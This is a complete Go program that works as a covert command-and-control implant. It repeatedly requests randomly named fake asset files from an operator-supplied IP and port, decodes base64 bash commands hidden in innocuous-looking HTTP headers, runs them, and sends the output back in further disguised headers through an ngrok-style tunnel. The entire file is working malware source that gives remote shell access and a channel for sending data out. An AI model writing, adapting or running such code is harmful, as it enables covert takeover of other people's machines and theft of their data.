package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"time"
)

// generateRandomFilename creates a random filename with extension
func generateRandomFilename() string {
	extensions := []string{
		"jpg", "png", "gif", "pdf", "doc", "xls", "txt", "html", "css", "js",
		"zip", "rar", "mp3", "mp4", "avi", "mov", "json", "xml", "csv", "svg",
	}

	nameLength := rand.Intn(9) + 8
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	name := make([]byte, nameLength)
	for i := range name {
		name[i] = chars[rand.Intn(len(chars))]
	}

	extension := extensions[rand.Intn(len(extensions))]

	return fmt.Sprintf("%s.%s", string(name), extension)
}

// executeCommand runs the given bash command and returns its output
func executeCommand(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()

	if err != nil {
		return "", fmt.Errorf("command execution error: %v, stderr: %s", err, stderr.String())
	}

	return out.String(), nil
}

func decrypt(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func encrypt(data string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(data))
	return encoded
}

const (
	FINGERPRINT_HEADER = "Transfer-Context"
	COMMAND_HEADER     = "Cache-Cache-Protocol"
	ID_HEADER          = "Context-Verification"
	STATUS_HEADER      = "X-DNS-Record"
	RESULT_HEADER      = "X-Resource-Priority"
)

func main() {
	fingerprint := os.Args[1]
	ip := os.Args[2]
	port := os.Args[3]

	rand.Seed(time.Now().UnixNano())

	for {
		// Random sleep time between 1 and 5 minutes
		// sleepTime := time.Duration(rand.Intn(4*60)+60) * time.Second
		sleepTime := time.Second * 5
		time.Sleep(sleepTime)

		// Generate a random filename
		filename := generateRandomFilename()
		url := fmt.Sprintf("http://%s:%s/assets/%s", ip, port, filename)

		// Create HTTP request
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("Error creating HTTP request:", err)
			continue
		}

		req.Header.Set(FINGERPRINT_HEADER, fingerprint)
		req.Header.Set("ngrok-skip-browser-warning", "true")

		// Make the HTTP request
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error making HTTP request:", err)
			continue
		}

		// Check for command
		command := decrypt(resp.Header.Get(COMMAND_HEADER))
		if command == "" {
			fmt.Println("No command received in response header")
			continue
		}

		fmt.Println("Received command:", command)

		id := resp.Header.Get(ID_HEADER)
		if id == "" {
			fmt.Println("No ID received in response header")
			continue
		}
		fmt.Println("Received ID:", id)

		resp.Body.Close()

		// Execute the decoded bash command
		cmdOutput, err := executeCommand(command)
		status := ""
		if err != nil {
			status = "error"
			cmdOutput = err.Error()
		} else {
			status = "success"
		}

		// Set up the follow-up request
		filename = generateRandomFilename()
		url = fmt.Sprintf("http://%s:%s/assets/%s", ip, port, filename)
		followupReq, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Println("Error creating follow-up request:", err)
			continue
		}

		followupReq.Header.Set(RESULT_HEADER, encrypt(cmdOutput))
		followupReq.Header.Set(STATUS_HEADER, encrypt(status))
		followupReq.Header.Set(ID_HEADER, id)
		followupReq.Header.Set(FINGERPRINT_HEADER, fingerprint)
		followupReq.Header.Set("ngrok-skip-browser-warning", "true")

		// Send the follow-up request
		_, err = client.Do(followupReq)
		if err != nil {
			fmt.Println("Error sending follow-up request:", err)
			continue
		}

		time.Sleep(time.Second * 5)
		break
	}
}
